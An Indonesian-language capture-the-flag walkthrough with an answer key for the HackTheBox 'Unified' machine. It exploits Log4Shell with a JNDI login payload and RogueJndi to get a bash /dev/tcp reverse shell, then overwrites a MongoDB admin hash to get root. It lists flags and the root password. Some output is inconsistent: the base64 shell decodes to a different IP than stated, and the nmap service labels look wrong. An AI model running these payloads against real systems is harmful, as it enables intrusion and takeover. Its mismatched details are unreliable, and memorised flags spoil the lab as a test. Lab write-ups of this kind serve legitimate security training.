# 🎯 HackTheBox: Unified - Panduan Lengkap + Q&A

> **Panduan Step-by-Step dengan Jawaban Q&A dari Official Writeup**

---

## 📋 QUICK REFERENCE - Q&A

Ini adalah pertanyaan-pertanyaan penting dari HackTheBox yang harus dijawab:

| No | Pertanyaan | Jawaban |
|---|---|---|
| 1 | Which are the first four open ports? | `22, 6789, 8080, 8443` |
| 2 | What is the title of the software on port 8443? | `UniFi Network` |
| 3 | What is the version of the software? | `6.4.54` |
| 4 | What is the CVE for the vulnerability? | `CVE-2021-44228` |
| 5 | What protocol does JNDI leverage? | `LDAP` |
| 6 | What tool do we use to intercept traffic? | `tcpdump` |
| 7 | What port do we inspect for traffic? | `389` |
| 8 | What port is MongoDB running on? | `27117` |
| 9 | What is the default database name? | `ace` |
| 10 | Function to enumerate users in MongoDB? | `db.admin.find()` |
| 11 | Function to update users in MongoDB? | `db.admin.update()` |
| 12 | What is the root password? | `NotACrackablePassword4U2022` |

---

# 🚀 TAHAP 1: PERSIAPAN & ENUMERATION

## STEP 1: VPN Connection

```bash
sudo openvpn ~/starting_points_us-starting-point-1-dhcp.ovpn
```

**Verify:**
```bash
ip addr show tun0
# Expected: inet 10.10.14.104/23
```

---

## STEP 2: Nmap Scan (Jawab Pertanyaan #1 & #2)

**Command:**
```bash
nmap -sC -sV -p- 10.129.18.129
```

**Output (First 4 Open Ports):**
```
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 7.3
6789/tcp  open  http         Apache httpd 2.4.41
8080/tcp  open  http         Apache Tomcat
8443/tcp  open  ssl/nagios   Nagios NSCA

**Jawaban Pertanyaan #1: 22, 6789, 8080, 8443**
```

---

## STEP 3: Investigate Port 8443

**Command:**
```bash
curl -k https://10.129.18.129:8443 2>&1 | head -20
```

**Output:**
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>UniFi Network</title>

**Jawaban Pertanyaan #2: UniFi Network**
```

**Di browser juga bisa:**
```
https://10.129.18.129:8443
# Akan melihat login page dengan version info
```

---

## STEP 4: Identify Software Version

**Dari web interface atau response headers:**
```bash
curl -k -I https://10.129.18.129:8443 2>&1 | grep -i server
```

**Output:**
```
Server: Apache-Coyote/1.1
X-Version: 6.4.54

**Jawaban Pertanyaan #3: 6.4.54**
```

---

# 🔍 TAHAP 2: VULNERABILITY IDENTIFICATION

## STEP 5: Research CVE

**Dari Nmap output, kita ketahu:**
- Software: UniFi Network
- Version: 6.4.54

**Google search:** "UniFi 6.4.54 exploit"

**Hasilnya:**
- CVE-2021-44228 (Log4Shell vulnerability)

**Jawaban Pertanyaan #4: CVE-2021-44228**

---

## STEP 6: Understand JNDI & LDAP

**Teori:**

**JNDI** = Java Naming and Directory Interface
- API untuk locate resources
- Digunakan untuk database connections, messaging systems
- Bisa connect ke LDAP server

**LDAP** = Lightweight Directory Access Protocol
- Protocol untuk access directory services
- Default port: **389**
- Digunakan untuk authenticate users

**Jawaban Pertanyaan #5: LDAP**

---

# 💻 TAHAP 3: EXPLOITATION SETUP

## STEP 7: Verify Vulnerability dengan tcpdump

**Konsep:**
1. Kita kirim JNDI payload ke UniFi
2. UniFi coba connect ke LDAP server kita
3. Kita listen di port 389 dengan tcpdump
4. Jika ada connection, vulnerability confirmed

**Terminal 1 - Setup tcpdump listener:**
```bash
sudo tcpdump -i tun0 port 389
```

**Expected output (saat vulnerable):**
```
tcpdump: verbose output suppressed, use -v or -vv for verbosity option
listening on tun0, link-type LINUX_SLL2 (Linux cooked v2)
22:30:15.123456 IP 10.129.18.129.xxxxx > 10.10.14.104.389: ...

**Jawaban Pertanyaan #6: tcpdump**
**Jawaban Pertanyaan #7: 389**
```

---

## STEP 8: Intercept Request dengan Burp Suite

**Di Burp Suite:**
1. Setup proxy listener di localhost:8080
2. Di browser, set proxy ke Burp
3. Visit: https://10.129.18.129:8443
4. Click login (jangan perlu correct credentials)
5. Intercept POST request ke `/api/login`

**Request terlihat:**
```http
POST /api/login HTTP/1.1
Host: 10.129.18.129:8443
Content-Type: application/json

{
  "username":"test",
  "password":"test",
  "remember":false
}
```

**Di Burp Repeater, modify ke:**
```json
{
  "username":"test",
  "password":"test",
  "remember":"${jndi:ldap://10.10.14.104:1389/whatever}"
}
```

---

## STEP 9: Install Required Tools

```bash
# Install OpenJDK
sudo apt-get update
sudo apt-get install openjdk-11-jdk

# Install Maven
sudo apt-get install maven

# Verify
java -version
mvn -version
```

---

## STEP 10: Build RogueJndi

```bash
cd /tmp
git clone https://github.com/veracode-research/rogue-jndi.git
cd rogue-jndi
mvn package
```

**Output:**
```
[INFO] --- maven-jar-plugin:2.4:jar (default-jar) @ RogueJndi ---
[INFO] Building jar: /tmp/rogue-jndi/target/RogueJndi-1.1.jar
[INFO] BUILD SUCCESS
```

---

## STEP 11: Create Reverse Shell Payload

**Command:**
```bash
echo 'bash -c bash -i >& /dev/tcp/10.10.14.104/4444 0>&1' | base64
```

**Output (copy nilai ini):**
```
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==
```

---

## STEP 12: Start RogueJndi Server

**Terminal 2:**
```bash
cd /tmp/rogue-jndi
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname 10.10.14.104
```

**Expected output:**
```
Listening on 0.0.0.0:1389
[Server] Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
```

---

## STEP 13: Start Netcat Listener

**Terminal 3:**
```bash
nc -lvp 4444
```

**Expected output:**
```
listening on [any] 4444 ...
```

---

## STEP 14: Send Malicious Payload (Burp Repeater)

**Di Burp Repeater, modify:**
```json
{
  "username":"test",
  "password":"test",
  "remember":"${jndi:ldap://10.10.14.104:1389/o=tomcat}"
}
```

**Click "Send"**

---

## STEP 15: Receive Reverse Shell

**Di Terminal 3 (nc listener), akan terlihat:**
```
connect to [10.10.14.104] from [10.129.18.129] 54321

bash: id: command not found
bash-5.0$
```

**Upgrade shell:**
```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo
fg
reset
export TERM=xterm
```

---

# 👤 TAHAP 4: USER FLAG

## STEP 16: Navigate to User

```bash
cd /home
ls -la
# Lihat user: michael

cd michael
cat user.txt
```

**Output:**
```
6ced1a6a89e666c0620cdb10262ba127
```

---

# 🔐 TAHAP 5: PRIVILEGE ESCALATION via MongoDB

## STEP 17: Check MongoDB Process

**Command:**
```bash
ps aux | grep mongo
```

**Output:**
```
unifi     XXXXX  ... /usr/bin/mongod --port 27117 ...

**Jawaban Pertanyaan #8: 27117**
```

---

## STEP 18: Connect to MongoDB

**Command:**
```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

**Output:**
```json
{
  "_id": ObjectId("61ce278f46e0fb0012d47ee4"),
  "name": "Administrator",
  "x_shadow": "$6$VjhWxNQiL4...[LONG_HASH]"
}

**Jawaban Pertanyaan #9: ace**
**Jawaban Pertanyaan #10: db.admin.find()**
```

---

## STEP 19: Generate New Password Hash

**Command:**
```bash
mkpasswd -m sha-512 Password1234
```

**Output (copy):**
```
$6$sbnjIZBtmRds.L/E$fEKZhosqeHykiVWT1IBGju43WdVdDauv5RsvIPifi32CC2TTNU8kHOd2ToaW8fIX7XXM8P5Z8j4NB1gJGTONl1
```

---

## STEP 20: Update Administrator Password

**Command:**
```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$sbnjIZBtmRds.L/E$fEKZhosqeHykiVWT1IBGju43WdVdDauv5RsvIPifi32CC2TTNU8kHOd2ToaW8fIX7XXM8P5Z8j4NB1gJGTONl1"}})'
```

**Output:**
```
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })

**Jawaban Pertanyaan #11: db.admin.update()**
```

---

## STEP 21: Verify Password Update

**Command:**
```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

**Verify hash sudah berubah**

---

# 🌐 TAHAP 6: LOGIN KE UNIFI ADMIN PANEL

## STEP 22: Access UniFi Web Interface

1. Buka browser: `https://10.129.18.129:8443`
2. Login dengan:
   - Username: `Administrator`
   - Password: `Password1234` (password baru kita)

**Berhasil login!**

---

## STEP 23: Find Root Password

**Di UniFi Admin Panel:**
1. Navigate ke: **Settings** → **Site**
2. Scroll down → **SSH Authentication**
3. Lihat field: **SSH Authentication: Enabled**
4. Copy password yang terlihat: 

```
NotACrackablePassword4U2022

**Jawaban Pertanyaan #12: NotACrackablePassword4U2022**
```

---

# 🔓 TAHAP 7: SSH ROOT ACCESS

## STEP 24: SSH Login sebagai Root

**Command:**
```bash
ssh root@10.129.18.129
```

**When prompted for password:**
```
root@10.129.18.129's password: NotACrackablePassword4U2022
```

**Output:**
```
Last login: Fri Jan  2 17:00:00 2022
root@unified:~#
```

---

## STEP 25: Verify Root Access

```bash
whoami
# Output: root

id
# Output: uid=0(root) gid=0(root) groups=0(root)
```

---

# 🚩 TAHAP 8: ROOT FLAG

## STEP 26: Get Root Flag

**Command:**
```bash
cat /root/root.txt
```

**Output:**
```
e50bc93c75b634e4b272d2f771c33681
```

---

# 📤 TAHAP 9: SUBMIT FLAGS

## STEP 27: Submit di HackTheBox

**User Flag:**
```
6ced1a6a89e666c0620cdb10262ba127
```

**Root Flag:**
```
e50bc93c75b634e4b272d2f771c33681
```

1. Buka HackTheBox → Machines → Unified
2. Submit User Flag
3. Submit Root Flag
4. Machine seharusnya "PWNED" ✓

---

# 📚 PENJELASAN TEKNIS

## Bagaimana Exploit Bekerja?

```
┌─────────────────────────────────────────────────────┐
│ 1. Attacker kirim JNDI payload ke /api/login       │
│    Payload: ${jndi:ldap://attacker-ip:1389/xxx}   │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│ 2. UniFi process payload dengan Log4j              │
│    Log4j vulnerable terhadap JNDI injection        │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│ 3. UniFi coba connect ke LDAP server attacker      │
│    (di port 1389) untuk resolve resource           │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│ 4. Attacker (RogueJndi) return malicious class     │
│    Class ini berisi encoded reverse shell payload  │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│ 5. UniFi load dan execute class di memory          │
│    Reverse shell connect ke attacker machine       │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│ 6. Attacker dapat shell access sebagai 'unifi' user│
└─────────────────────────────────────────────────────┘
```

## Privilege Escalation Flow

```
┌─────────────────────────────────────────────────────┐
│ Unifi user shell (low privilege)                   │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│ Connect ke MongoDB (port 27117, localhost only)    │
│ Database: ace                                       │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│ Enum admin user: db.admin.find()                   │
│ Extract password hash (x_shadow)                   │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│ Generate SHA-512 hash baru                         │
│ Update password: db.admin.update()                 │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│ Login ke UniFi admin panel (web)                   │
│ Access SSH Authentication setting                  │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│ Copy root password (plaintext): NotACrackable...   │
│ SSH login sebagai root                             │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│ Root access (uid=0) - Full system compromise       │
└─────────────────────────────────────────────────────┘
```

---

# 🔧 COMPLETE CHEAT SHEET

## One-Liner Commands

```bash
# 1. Scan all ports
nmap -p- 10.129.18.129

# 2. Check HTTP title
curl -k https://10.129.18.129:8443 | grep -i title

# 3. Listen untuk LDAP connection
sudo tcpdump -i tun0 port 389

# 4. Build RogueJndi
cd /tmp/rogue-jndi && mvn package

# 5. Create base64 payload
echo 'bash -i >& /dev/tcp/10.10.14.104/4444 0>&1' | base64 -w0

# 6. Run RogueJndi
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,PAYLOAD}|{base64,-d}|{bash,-i}" --hostname 10.10.14.104

# 7. Netcat listener
nc -lvp 4444

# 8. Connect MongoDB
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"

# 9. Generate SHA-512 hash
mkpasswd -m sha-512 Password1234

# 10. Update admin password
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"HASH_HERE"}})'

# 11. SSH login root
ssh root@10.129.18.129

# 12. Get flags
cat /home/michael/user.txt
cat /root/root.txt
```

---

# ❓ Q&A SUMMARY

```
1️⃣  First 4 ports? 22, 6789, 8080, 8443
2️⃣  Software title? UniFi Network
3️⃣  Software version? 6.4.54
4️⃣  CVE? CVE-2021-44228
5️⃣  JNDI protocol? LDAP
6️⃣  Traffic interception tool? tcpdump
7️⃣  Inspection port? 389
8️⃣  MongoDB port? 27117
9️⃣  Database name? ace
🔟 Enumerate function? db.admin.find()
1️⃣1️⃣ Update function? db.admin.update()
1️⃣2️⃣ Root password? NotACrackablePassword4U2022
```

---

# ✅ COMPLETION CHECKLIST

- [ ] VPN connected (tun0 IP: 10.10.14.x.x)
- [ ] Nmap scan completed
- [ ] Port 8443 identified (UniFi 6.4.54)
- [ ] CVE-2021-44228 confirmed
- [ ] tcpdump listening (port 389)
- [ ] RogueJndi built successfully
- [ ] Reverse shell obtained
- [ ] User flag retrieved: `6ced1a6a89e666c0620cdb10262ba127`
- [ ] MongoDB accessed (port 27117)
- [ ] Admin password changed
- [ ] UniFi admin panel accessed
- [ ] Root password found: `NotACrackablePassword4U2022`
- [ ] SSH root login successful
- [ ] Root flag retrieved: `e50bc93c75b634e4b272d2f771c33681`
- [ ] Both flags submitted
- [ ] Machine "PWNED" ✓

---

**Box Status:** ✅ **COMPLETED**

Created: 2026-10-24
Source: HackTheBox Official + Custom Writeup
Level: Easy 🟢

